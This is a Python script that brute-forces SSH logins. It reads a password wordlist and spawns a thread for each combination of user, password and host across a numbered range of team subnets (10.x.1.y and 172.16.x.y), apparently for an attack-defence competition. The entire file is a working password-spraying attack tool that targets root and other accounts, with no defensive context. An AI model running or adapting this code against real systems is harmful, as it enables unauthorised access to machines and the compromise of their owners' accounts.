import pty
import sys
import asyncio
import pexpect
import threading

def ssh(user, host, password, timeout=2):
	try:                                                                                                                                                                                                                                                                                                         
		ssh_cmd = f'ssh {user}@{host}'                                                                                                              
		child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")                                                                                                                            
		child.expect(['password: '])
		print(f"User: {user}\tHost: {host}: Pwd: {password}")                                                                                                                                                                                                                                                                                               
		child.sendline(password)                                                                                                                                                                                                                                                                                                     
		child.expect(pexpect.EOF)                                                                                                                                                  
		child.close()
	except:
		return                                                                                                                                                                                                                                                                                                             

with open("wordlist.txt") as f:
	default_passwords = f.readlines()


users = ["root", "jimmu", "suizei", "annei", "itoku"]


all_pass = []
for i in range(len(default_passwords)):
	for j in range(len(default_passwords)):
		for k in range(1, 17):
			one = default_passwords[i]
			two = default_passwords[j]
			if k < 10:
				all_pass += [f"{one.capitalize()}-{two}-0{k}!"]
				all_pass += [f"{two.capitalize()}-{one}-0{k}!"]

			else:
				all_pass += [f"{one.capitalize()}-{two}-{k}!"]
				all_pass += [f"{two.capitalize()}-{one}-{k}!"]


# each team
for team in range(1, 17):
	# each teams servers
	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
		# check each default password
		for password in default_passwords:
			for user in users:
				x = threading.Thread(target=ssh, args=(user, f"10.{team}.1.{server}", password))
				x.start()
				y = threading.Thread(target=ssh, args=(user, f"172.16.{team}.{server}", password))
				y.start()






